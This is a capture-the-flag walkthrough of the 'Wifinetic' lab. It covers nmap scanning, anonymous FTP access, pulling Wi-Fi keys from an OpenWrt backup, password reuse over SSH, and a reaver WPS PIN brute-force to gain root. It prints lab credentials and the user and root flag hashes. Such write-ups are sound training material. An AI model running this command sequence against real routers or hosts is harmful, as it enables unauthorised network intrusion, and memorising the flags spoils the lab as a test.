@@ -1,0 +1,124 @@
+Wifinetic Lab: Vulnerabilities: WPS brute-force, password reuse, ftp anonymous server
+
+Enumeration
+
+sudo nmap -sV -sC -p- --min-rate=1000 -Pn 10.129.229.90
+PORT   STATE SERVICE    VERSION
+21/tcp open  ftp        vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 ftp      ftp          4434 Jul 31  2023 MigrateOpenWrt.txt
+| -rw-r--r--    1 ftp      ftp       2501210 Jul 31  2023 ProjectGreatMigration.pdf
+| -rw-r--r--    1 ftp      ftp         60857 Jul 31  2023 ProjectOpenWRT.pdf
+| -rw-r--r--    1 ftp      ftp         40960 Sep 11  2023 backup-OpenWrt-2023-07-26.tar
+|_-rw-r--r--    1 ftp      ftp         52946 Jul 31  2023 employees_wellness.pdf
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.14.188
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+53/tcp open  tcpwrapped
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Let’s take a visit to the ftp server via anonymous login
+
+wifinetic.htb found this domain in ProjectGreatMigration.pdf
+
+Found more information in ProjectOpenWRT.pdf 
+Oliver Walker
+Wireless Network Administrator
+olivia.walker17@wifinetic.htb
+
+Found more information in employees_wellnes.pdf
+Samantha Wood
+HR Manager
+samantha.wood93@wifinetic.htb
+
+
+tar -xvf backup-OpenWrt-2023-07-26.tar
+
+Here are the files/directories:
+└──╼ [★]$ ls
+config    hosts         nftables.d  profile   shinit       uhttpd.key
+dropbear  inittab       opkg        rc.local  sysctl.conf
+group     luci-uploads  passwd      shells    uhttpd.crt
+
+
+
+We found a file in ~/etc/passwd which contained:
+root:x:0:0:root:/root:/bin/ash
+daemon:*:1:1:daemon:/var:/bin/false
+ftp:*:55:55:ftp:/home/ftp:/bin/false
+network:*:101:101:network:/var:/bin/false
+nobody:*:65534:65534:nobody:/var:/bin/false
+ntp:x:123:123:ntp:/var/run/ntp:/bin/false
+dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false
+logd:x:514:514:logd:/var/run/logd:/bin/false
+ubus:x:81:81:ubus:/var/run/ubus:/bin/false
+netadmin:x:999:999::/home/netadmin:/bin/false
+
+
+Found this in ~/etc/config/rpcd:
+config login
+	option username 'root'
+	option password '$p$root'
+	list read '*'
+	list write '*'
+
+Found this in ~/etc/config/wireless
+config wifi-iface 'wifinet1'
+	option device 'radio1'
+	option mode 'sta'
+	option network 'wwan'
+	option ssid 'OpenWrt'
+	option encryption 'psk'
+	option key 'VeRyUniUqWiFIPasswrd1!'
+
+
+Initial Foothold
+
+
+This worked and gave us access
+
+ssh netadmin@10.129.229.90
+With the password: VeRyUniUqWiFIPasswrd1!
+
+netadmin@wifinetic:~$ cat user.txt
+cb315ae72fc4ba4e7bbb1ca1a6a9ed64
+
+
+Privilege Escalation
+
+
+Check if we can exploit any sudo binaries/permissions
+sudo -l
+
+netadmin@wifinetic:~$ sudo -l
+[sudo] password for netadmin: 
+Sorry, user netadmin may not run sudo on wifinetic.
+
+We found this tool on the netadmin host and we discovered the monitoring interface mon0
+
+reaver -i mon0 -b 02:00:00:00:00:00 -vv -c 1
+-We basically told reaver to monitor the traffic from the monitoring interface, and we understood that wlan0 is an WPS AP that is susceptible to brute-force. 
+
+Output:
+[+] WPS PIN: '12345670'
+[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
+
+Now we have root access
+
+root@wifinetic:~# cat root.txt
+96bd9f7deec052e5bb81010fa21048cc
